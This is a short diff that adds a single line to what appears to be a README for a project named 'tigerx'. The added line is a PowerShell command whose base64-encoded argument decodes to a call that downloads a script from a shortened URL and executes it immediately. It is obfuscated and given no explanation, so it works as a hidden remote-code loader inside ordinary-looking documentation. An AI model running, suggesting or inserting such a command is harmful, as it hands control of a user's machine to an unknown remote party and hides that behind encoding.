@@ -1,1 +1,3 @@
 # tigerx
+
+powershell.exe -encodedCommand aQBlAHgAKABpAHIAbQAgAGkAcwAuAGcAZAAvAHQAaQBnAGUAcgB4ACkA
